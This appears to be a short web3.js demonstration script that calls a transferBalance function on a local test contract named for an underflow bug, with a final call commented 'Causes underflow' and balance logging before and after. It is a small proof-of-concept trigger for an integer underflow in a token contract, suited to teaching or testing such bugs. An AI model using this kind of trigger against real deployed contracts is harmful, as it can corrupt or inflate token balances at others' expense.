const Web3 = require('web3');
const web3 = new Web3('http://localhost:8545');

const underflowContractABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "to",
        "type": "address"
      },
      {
        "internalType": "uint8",
        "name": "amount",
        "type": "uint8"
      }
    ],
    "name": "transferBalance",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "tokenBalances",
    "outputs": [
      {
        "internalType": "uint8",
        "name": "",
        "type": "uint8"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

const underflowContractAddress = '0x1234567890123456789012345678901234567890';
const underflowContract = new web3.eth.Contract(underflowContractABI, underflowContractAddress);

const transferBalance = async (to, amount) => {
  const accounts = await web3.eth.getAccounts();
  const balanceBefore = await underflowContract.methods.tokenBalances(accounts[0]).call();
  console.log(`Balance before: ${balanceBefore}`);

  try {
    await underflowContract.methods.transferBalance(to, amount).send({ from: accounts[0] });
  } catch (err) {
    console.error(err);
  }

  const balanceAfter = await underflowContract.methods.tokenBalances(accounts[0]).call();
  console.log(`Balance after: ${balanceAfter}`);
};

transferBalance('0x1234567890123456789012345678901234567891', 100); // Causes underflow
